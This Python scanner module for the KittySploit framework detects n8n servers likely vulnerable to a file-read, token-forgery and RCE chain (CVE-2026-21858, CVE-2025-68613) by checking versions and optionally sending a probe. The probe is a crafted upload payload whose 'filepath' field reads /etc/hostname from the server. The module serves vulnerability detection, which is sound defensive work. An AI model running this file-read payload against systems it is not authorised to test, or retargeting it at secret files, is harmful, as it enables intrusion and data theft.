#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "n8n CVE-2026-21858 + CVE-2025-68613 detection",
        "description": (
            "Detects n8n instances likely vulnerable to the full chain "
            "(arbitrary file read + admin token forgery + workflow expression RCE)."
        ),
        "author": ["Chocapikk", "KittySploit Team"],
        "severity": "high",
        "cve": ["CVE-2026-21858", "CVE-2025-68613"],
        "references": [
            "https://github.com/Chocapikk/CVE-2026-21858",
        ],
        "modules": [
            "exploits/linux/http/n8n_full_chain_rce",
        ],
        "tags": ["web", "scanner", "n8n", "lfi", "jwt", "rce", "full-chain"],
    }

    port = OptPort(5678, "Target port (n8n default)", True)
    ssl = OptBool(False, "SSL enabled: true/false", True, advanced=True)
    form_path = OptString("/form/upload", "Form upload path potentially vulnerable to CVE-2026-21858", required=False)
    active_probe = OptBool(
        False,
        "Try safe probes against form_path and /rest/users (non-destructive)",
        required=False,
    )

    @staticmethod
    def _version_tuple(v: str):
        parts = []
        for p in str(v or "").split("."):
            digits = "".join(ch for ch in p if ch.isdigit())
            parts.append(int(digits) if digits else 0)
        while len(parts) < 3:
            parts.append(0)
        return tuple(parts[:3])

    def _likely_vulnerable_version(self, version: str) -> bool:
        # Based on PoC logic: vulnerable when major < 1 or (major == 1 and minor < 121)
        vt = self._version_tuple(version)
        major, minor = vt[0], vt[1]
        return major < 1 or (major == 1 and minor < 121)

    def _safe_form_probe(self) -> bool:
        marker = self.random_text(8)
        payload = {
            "data": {},
            "files": {
                f"f-{self.random_text(6)}": {
                    "filepath": "/etc/hostname",
                    "originalFilename": f"{marker}.bin",
                    "mimetype": "application/octet-stream",
                    "size": 12345,
                }
            },
        }
        response = self.http_request(
            method="POST",
            path="/" + str(self.form_path).lstrip("/"),
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=max(int(self.timeout or 10), 10),
        )
        if not response:
            return False
        if response.status_code != 200:
            return False
        content = response.content or b""
        return len(content) > 0

    def run(self):
        try:
            settings = self.http_request(method="GET", path="/rest/settings", timeout=10, allow_redirects=True)
            if not settings or settings.status_code != 200:
                return False

            try:
                data = settings.json() or {}
            except Exception:
                self.set_info(
                    severity="medium",
                    cve="CVE-2026-21858",
                    reason="n8n /rest/settings is reachable but JSON parsing failed",
                )
                return True

            version = str((data.get("data") or {}).get("versionCli", "0.0.0"))
            vulnerable_by_version = self._likely_vulnerable_version(version)
            if not vulnerable_by_version:
                return False

            if not self.active_probe:
                self.set_info(
                    severity="high",
                    cve="CVE-2026-21858",
                    reason=(
                        f"n8n version {version} is in expected vulnerable range for full-chain exposure; "
                        "active probes disabled"
                    ),
                )
                return True

            form_probe_ok = self._safe_form_probe()
            users_endpoint = self.http_request(method="GET", path="/rest/users", timeout=10, allow_redirects=False)
            users_requires_auth = bool(users_endpoint and users_endpoint.status_code in (401, 403))

            if form_probe_ok:
                sev = "high" if users_requires_auth else "critical"
                reason = (
                    f"n8n {version} in vulnerable range; form_path probe returned data. "
                    f"/rest/users returned HTTP {users_endpoint.status_code if users_endpoint else 'n/a'}"
                )
                self.set_info(severity=sev, cve="CVE-2026-21858", reason=reason)
                return True

            self.set_info(
                severity="medium",
                cve="CVE-2026-21858",
                reason=(
                    f"n8n {version} in vulnerable range but active form probe was inconclusive "
                    f"(HTTP {users_endpoint.status_code if users_endpoint else 'n/a'} on /rest/users)"
                ),
            )
            return True
        except Exception as exc:
            print_error(f"Scanner failed: {exc}")
            return False
